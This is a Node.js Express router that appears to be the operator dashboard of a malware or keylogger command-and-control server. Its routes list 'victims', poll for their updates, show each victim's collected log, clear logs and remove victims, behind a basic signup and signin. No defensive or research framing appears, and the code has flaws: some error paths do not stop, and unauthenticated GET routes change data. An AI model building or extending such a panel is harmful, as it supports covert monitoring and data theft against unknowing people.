var express = require('express');
var router = express.Router();
var user_md = require('../models/user');
var victims_md = require('../models/victims');
var helper = require('../helpers/helper');

/* GET home page. */
router.get('/', function(req, res, next) {
    var data = victims_md.getAllVictims();
    data.then(function(victims){
        var victim = {
            victims: victims,
            error: false
        };

        res.render('admin/dashboard', {data: victim});
    }).catch(function(err){
        res.render('admin/dashboard', {data: {error: "Get victim data is error"}});
    });
});

router.get('/update', function(req, res, next) {
    var data = victims_md.getAllVictims();
    data.then(function(victims){
        var victim = {
            victims: victims,
            error: false
        };

        res.send(victim);
    }).catch(function(err){
        var victim = {
            error: "Get victim data is error"
        };

        res.send(victim);
    });
});

router.get('/signup', function(req, res) {
    res.render('signup', {data: {}});
});

router.post('/signup', function(req, res){
    var user = req.body;

    if(user.user.trim().length == 0){
        res.render('signup', {data: {error: 'Username is required'}});
    }

    if(user.passwd.trim().length == 0 || user.repasswd.trim().length == 0 || user.passwd != user.repasswd){
        res.render('signup', {data: {error: 'Password is not match'}});
    }

    //Insert DB
    var password = helper.hash_password(user.passwd);

    user = {
        username: user.user,
        password: password
    };

    var result = user_md.addUser(user);
    result.then(function(data){
        res.redirect('/admin/signin');
    }).catch(function(err){
        res.render('signup', {data: {error: 'Could not insert user data to DB'}});
    });
});

router.get('/signin', function(req, res){
    res.render('signin', {data: {}});
});

router.post('/signin', function(req, res){
    var params = req.body;

    if(params.username.trim().length == 0){
        res.render('signin', {data: {error: "Please enter username"}});
    }else if(params.password.trim().length == 0){
        res.render('signin', {data: {error: "Please enter password"}});
    }else{
        var data = user_md.getUserByUsername(params.username);

        if(data){
            data.then(function(users) {
               var user = users[0];

               var status = helper.compare_password(params.password, user.password);
               if(!status){
                   res.render('signin', {data: {error: "Password wrong"}});
               }else{
                   req.session.user = user;
                    console.log(req.session.user);
                   res.redirect('/admin');
               }
            });
        }else{
            res.render('signin', {data: {error: "User not exists"}});
        }
    }
});

router.get('/interface/:id', function(req, res){
    var params = req.params;
    var id = params.id;

    var victim = victims_md.getVictimByID(id);

    if(victim){
        victim.then(function(victims){
            var victim = victims[0];
            var data = {
                victim: victim,
                error: false
            };
            console.log(victim.id);
            res.render('admin/interface', {data: data});
        }).catch(function(err){
            var data = {
                error: 'Could not get Victim by ID'
            };

            res.render('admin/interface', {data: data});
        });
    }else{
        var data = {
            error: 'Could not get Victim by ID'
        };

        res.render('admin/interface', {data: data});
    }
});

router.get('/interface/clearlog/:id', function(req, res) {
    var params = req.params;
    var id = params.id;

    var update = victims_md.updateLogByID(id, "");
    update.then(function(result) {
        res.redirect('/admin/interface/' + id);
    }).catch(function(err) {
        console.log('Can not update log by id');
    });
});

router.get('/remove/:id', function(req, res) {
    var params = req.params;
    var id = params.id;

    var update = victims_md.removeVictimByID(id, "");
    update.then(function(result) {
        res.redirect('/admin');
    }).catch(function(err) {
        console.log('Can not update log by id');
    });
});

module.exports = router;

